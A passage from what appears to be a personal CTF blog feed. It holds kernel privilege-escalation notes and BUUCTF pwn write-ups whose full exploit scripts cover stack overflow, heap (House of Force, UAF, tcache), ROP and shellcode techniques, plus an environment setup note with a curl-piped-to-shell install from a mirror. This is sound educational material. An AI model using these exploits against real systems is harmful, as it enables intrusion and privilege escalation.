used for restarting */</span></span><br></pre></td></tr></table></figure><p>实际上它的系统调用号为0，我们可以通过以下方式从用户态中调用其功能：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure><p>这将使内核调用在restart_block结构中的函数指针。</p><p>如果我们可以破坏thread_info中的restart_block成员中的函数指针，则可以将其指向我们控制下的用户空间中的函数，通过调用sys_restart_syscall触发其执行，并提权。</p><h3 id="Linux提权思路"><a href="#Linux提权思路" class="headerlink" title="Linux提权思路"></a>Linux提权思路</h3><p>之前说过，执行commit_creds(prepare_kernel_cred(0))，可以使进程的权限提升为root，然后我们返回到用户模式，执行iret指令。</p><p>关于iret指令：</p><ul><li><p>当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。</p></li><li><p>当使用iret指令返回到一个不同保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。</p></li><li><p>栈上保存了trap frame，返回到用户模式的时候，恢复信息从以下的结构读取：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment    +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags       +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF第三周</title>
      <link href="2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/"/>
      <url>2021/08/05/BUUCTF%E7%AC%AC%E4%B8%89%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h2><p>（较易）考点：</p><ul><li>fork子进程</li><li>stack smashing</li><li>利用environ确定任意栈地址</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please type your guessing flag&quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&quot;__environ&quot;</span>]</span><br><span class="line">    sla(<span class="string">&#x27;Please type your guessing flag&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(environ))</span><br><span class="line">    flag = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">0x168</span></span><br><span class="line">    sla(<span class="string">&quot;Please type your guessing flag&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x128</span> + p64(flag))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p>（较难）考点：</p><ul><li>mmap泄露堆地址</li><li>House of Force</li><li>realloc_hook调整栈帧使og生效</li></ul><p>卡在了泄露地址这个点，学到了mmap出来的空间相邻libc的地址</p><p>house of force改top chunk的地址为-1(0xfff…)</p><p>然后无限申请，算下malloc_hook的偏移到topchunk，然后申请到附近改那两个hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    libc_base = add(<span class="number">0x200000</span>, <span class="string">&#x27;mmap&#x27;</span>) + <span class="number">0x201000</span> - <span class="number">0x10</span></span><br><span class="line">    echo(<span class="string">&quot;base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    one_addr = add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)) - <span class="number">0x10</span></span><br><span class="line">    size = (libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]) - (one_addr + <span class="number">0x20</span>) - <span class="number">0x40</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(size))</span><br><span class="line">    add(size, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    binsh = add(<span class="number">0x40</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(libc_base + og[<span class="number">1</span>]) + p64(libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    gdba()</span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(<span class="number">0xdead</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-buffer-overflow-0"><a href="#picoctf-2018-buffer-overflow-0" class="headerlink" title="picoctf_2018_buffer overflow 0"></a>picoctf_2018_buffer overflow 0</h2><p>（较易）考点：</p><ul><li>栈溢出</li><li>signal调用后门函数</li></ul><p>ssh连接到服务器，运行函数通过命令行传入参数然后泄露出flag</p><h2 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h2><p>（中等）考点：</p><ul><li>UAF</li><li>堆布局构造unsorted bin</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;&gt; Input your code please:&quot;</span>, <span class="string">&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>),<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">&quot;RE is &quot;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) - <span class="number">0x80</span></span><br><span class="line">    echo(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span>, p64(heap + <span class="number">0x10</span>))</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">    add(<span class="number">0x30</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>), <span class="number">0x30</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>, p64(<span class="number">0</span>), p64(libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    </span><br><span class="line">    og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    payload = <span class="number">0x13</span> * <span class="string">&#x27;\x00&#x27;</span> + p64(libc.address + og[<span class="number">3</span>])</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add(0x50, p64(0xdeadbeef), 0x40, &#x27;hello&#x27;)</span></span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>（难）考点：</p><ul><li>部分可见字符的shellcode编写</li></ul><p>震撼我一整年</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;Show me your magic!&quot;</span>, <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>X86:<a href="https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/">https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/</a></p><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><p>（难）考点：</p><ul><li>realloc函数的特性</li><li>堆布局</li><li>2.27下的IO泄露地址</li></ul><p>总结：没有edit可以通过连续的free函数做uaf；由于不检查size，在只有heapptr的时候可以realloc(0)后构造overlap，覆盖victim的size，这样的效果可以使得逐个清空某个size大小的tcache bin，最终申请到freehook；泄露io直接申请到stdout的地方改writebase为0x58泄露IO-file-jumps的地址；爆破注意模板</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    dbg()</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x60</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p8(<span class="number">0x60</span>) + p8(<span class="number">0x97</span>)</span><br><span class="line">    add(<span class="number">0x110</span>, payload)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x58</span>))</span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    <span class="keyword">if</span> leak == -libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    backdoor()</span><br><span class="line">    __free_hook = leak + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x110</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x51</span>) + p64(__free_hook - <span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, p8((__free_hook - <span class="number">8</span>) &amp; <span class="number">0xff</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(leak + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="comment"># free()</span></span><br><span class="line">    gdba()</span><br><span class="line">    ia()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># io = process(challenge,env = &#123;&quot;LD_PRELOAD&quot;:libc_path_local&#125;)</span></span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29747</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019 拟态 STKOF"></a>强网杯2019 拟态 STKOF</h2><p>（较易）考点</p><ul><li>栈溢出</li><li>静态编译</li></ul><p>ROPgadget生成的ropchain长度超了，ropper可以</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    p = <span class="keyword">lambda</span> x : pack(<span class="string">&#x27;Q&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">    IMAGE_BASE_0 = <span class="number">0x0000000000400000</span> <span class="comment"># 40e64f05032527bd1aaaaf05161090bf0ee2f31afe5144cf358725e178579b73</span></span><br><span class="line">    rebase_0 = <span class="keyword">lambda</span> x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += <span class="string">&#x27;//bin/sh&#x27;</span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000005895</span>) <span class="comment"># 0x0000000000405895: pop rsi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003d9d5</span>) <span class="comment"># 0x000000000043d9d5: pop rdx; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003b97c</span>) <span class="comment"># 0x000000000043b97c: pop rax; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x000000000000003b</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000061645</span>) <span class="comment"># 0x0000000000461645: syscall; ret; </span></span><br><span class="line">    <span class="built_in">print</span> rop</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x118</span></span><br><span class="line">    payload += rop</span><br><span class="line"></span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    ru(<span class="string">&quot;We give you a little challenge, try to pwn it?&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a>ciscn_2019_final_5</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn环境搭建</title>
      <link href="2021/08/01/pwn%E7%8E%AF%E5%A2%83/"/>
      <url>2021/08/01/pwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>由于误操作把镜像扬了<br>md<br>重新搭建环境</p><h2 id="docker镜像下载"><a href="#docker镜像下载" class="headerlink" title="docker镜像下载"></a>docker镜像下载</h2><p>pwndocker没啥好说的<br>run起来<br><code>docker run -d --rm -h mypwn --name mypwn -v $(pwd):/ctf/work -p 23946:23946  --cap-add=SYS_PTRACE pwn</code><br>进bash<br><code>docker exec -it 2bc6d921117349347c72ebcbfe0f655b33d520f8e6562d1ec6e5f1b8b97f4a51 bash</code></p><h2 id="oh-my-zsh下载配置"><a href="#oh-my-zsh下载配置" class="headerlink" title="oh-my-zsh下载配置"></a>oh-my-zsh下载配置</h2><p>先安装zsh，apt install即可<br>然后安装oh-my-zsh<br><code>sh -c &quot;$(curl -fsSL https://cdn.devland.cn/shell/ohmyzsh.sh)&quot;</code></p><p>主题我选steeef，之前一直是ys，换个口味2333</p><h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h3><p>命令补全<br><code>git clone https://github.com.cnpmjs.org/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</code></p><h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a>zsh-syntax-highlighting</h3><p>命令高亮提示<br><code>git clone https://github.com.cnpmjs.org//zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</code></p><h3 id="配置文件插件部分"><a href="#配置文件插件部分" class="headerlink" title="配置文件插件部分"></a>配置文件插件部分</h3><p><code>plugins=(git zsh-syntax-highlighting zsh-autosuggestions z)</code></p><h2 id="glbc"><a href="#glbc" class="headerlink" title="glbc"></a>glbc</h2><p>通过之前pwn_debug编译的libc+source来配合调试程序</p><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>tmux配置文件改了改<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -g prefix `<span class="comment">#</span></span><br><span class="line">unbind C-b <span class="comment"># C-b即Ctrl+b键，unbind意味着解除绑定</span></span><br><span class="line"><span class="built_in">bind</span> ` send-prefix <span class="comment"># 绑定Ctrl+a为新的指令前缀</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bind</span> r source-file ~/.tmux.conf \; display-message <span class="string">&quot;Config reloaded..&quot;</span></span><br><span class="line"></span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">bind</span> - splitw -v -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># 垂直方向新增面板，默认进入当前目录</span></span><br><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> | splitw -h -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># 水平方向新增面板，默认进入当前目录</span></span><br><span class="line"></span><br><span class="line">set-option -g mouse on <span class="comment"># 等同于以上4个指令的效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定hjkl键为面板切换的上下左右键</span></span><br><span class="line"><span class="built_in">bind</span> -r k select-pane -U <span class="comment"># 绑定k为↑</span></span><br><span class="line"><span class="built_in">bind</span> -r j select-pane -D <span class="comment"># 绑定j为↓</span></span><br><span class="line"><span class="built_in">bind</span> -r h select-pane -L <span class="comment"># 绑定h为←</span></span><br><span class="line"><span class="built_in">bind</span> -r l select-pane -R <span class="comment"># 绑定l为→</span></span><br></pre></td></tr></table></figure></p><p>彳亍，目前就这么多，可能还有没想起来的再另说</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF第一周</title>
      <link href="2021/07/28/BUUCTF/"/>
      <url>2021/07/28/BUUCTF/</url>
      
        <content type="html"><![CDATA[<p>从一分题开始向后推</p><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>函数调用</li></ul><p>32位程序，有伪后门，构造bss段string调用后门</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme2&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please input:&quot;</span>)</span><br><span class="line">    pop_ret = <span class="number">0x08048409</span></span><br><span class="line">    payload = (<span class="number">0x6c</span> + <span class="number">0x4</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;gets&quot;</span>]) + p32(pop_ret) + p32(<span class="number">0x0804A060</span>) + p32(<span class="number">0x80485CB</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27788</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwnme2&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span 